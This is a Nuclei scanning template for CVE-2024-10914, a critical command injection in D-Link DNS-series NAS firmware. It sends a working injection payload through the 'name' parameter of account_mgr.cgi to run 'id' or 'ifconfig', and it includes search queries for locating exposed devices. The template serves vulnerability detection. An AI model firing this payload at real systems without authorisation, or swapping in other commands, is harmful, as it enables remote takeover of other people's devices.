id: CVE-2024-10914

info:
  name: D-Link NAS - Command Injection via Name Parameter
  author: s4e-io
  severity: critical
  description: |
    A vulnerability was found in D-Link DNS-320, DNS-320LW, DNS-325 and DNS-340L up to 20241028. It has been declared as critical. Affected by this vulnerability is the function cgi_user_add of the file /cgi-bin/account_mgr.cgi?cmd=cgi_user_add. The manipulation of the argument name leads to os command injection.
  reference:
    - https://github.com/verylazytech/CVE-2024-10914
    - https://www.usom.gov.tr/bildirim/tr-24-1836
    - https://nvd.nist.gov/vuln/detail/CVE-2024-10914
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-10914
    cwe-id: CWE-707
    epss-score: 0.93971
    epss-percentile: 0.9988
    cpe: cpe:2.3:o:dlink:dns-320_firmware:*:*:*:*:*:*:*:*
  metadata:
    vendor: dlink
    product: dns-320_firmware
    shodan-query: http.html:"sharecenter"
    fofa-query: body="sharecenter"
  tags: cve,cve2024,dlink,sharecenter,rce

http:
  - raw:
      - |
        GET /cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;{{command}};%27 HTTP/1.1
        Host: {{Hostname}}

    payloads:
      command:
        - "id"
        - "ifconfig"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "regex('uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)', body)"
          - "contains_all(body, 'inet addr:', 'Mask:')"
        condition: or

      - type: dsl
        dsl:
          - 'contains(body, "Content-type: text/html")'
          - "status_code == 200"
        condition: and
# digest: 4b0a00483046022100b6af2c24ee580f65a9badff50315f6f50771fea926a06637a10be6ad9708a971022100947b7de13a4e27842d17c444a24744854abd81b9c7ddeded6b64e3ab9679b940:922c64590222798bb761d5b6d8e72950